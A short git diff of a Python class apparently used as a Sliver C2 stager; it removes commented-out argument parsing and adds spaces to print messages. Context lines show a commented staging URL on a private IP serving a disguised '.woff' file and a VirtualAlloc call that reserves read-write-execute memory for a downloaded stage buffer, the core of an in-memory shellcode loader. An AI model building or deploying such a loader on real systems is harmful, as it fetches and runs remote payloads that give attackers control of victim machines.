@@ -39,21 +39,6 @@ class stage():
     def __init__(self, remote_host=str, remote_port=int):
         self.remote_host = remote_host
         self.remote_port = remote_port
-        #self.timeout = timeout
-        #self.architecture = architecture
-        #self.sleeptime = sleeptime
-
-    # def init():
-    #     spName = 'sliver-stage'
-    #     # flag, name, choices=, action=, default=, type, required, help)
-    #     spArgList = [
-    #         #['-a', '--arch', ['x64', 'x86'], None, 'x64', str, False, 'Architecture to use, x64 is the default'],
-    #         ['-p', '--port', None, None, 4444, int, True, 'Remote port to connect to'],
-    #         ['-r', '--remote-host', None, None, None, str, True, 'Remote host to connect to e.g. 192.168.2.1']
-    #         #['-s', '--sleep', None, None, 0, int, True, 'Sleep for x seconds before the stage is executed']
-    #         #['-t', '--timeout', None, None, 30, int, False, 'Connect timeout in seconds, 30 seconds is the default']
-    #     ]
-    #     utils.arg.CreateSubParserEx(spName, stage.Description, spArgList)
 
     def process(self):
         #static_url = 'https://172.17.253.140:9911/ObjectFile.woff'
@@ -75,9 +60,9 @@ class stage():
         print(f'{nstate.INFO} Stage length: {len(stage_buffer)}')
         ptr = self.VirtualAlloc(0, len(stage_buffer), self.MEM_COMMIT_RESERVE, self.PAGE_READWRITE_EXECUTE)
         if ptr:
-             print(f'{nstate.OKGREEN}Memory allocated!')
+             print(f'{nstate.OKGREEN} Memory allocated!')
         else:
-             print(f'{nstate.FAIL}Memory not allocated!')
+             print(f'{nstate.FAIL} Memory not allocated!')
              exit()
         buf = (ctypes.c_char * len(stage_buffer)).from_buffer(stage_buffer)
         if buf:
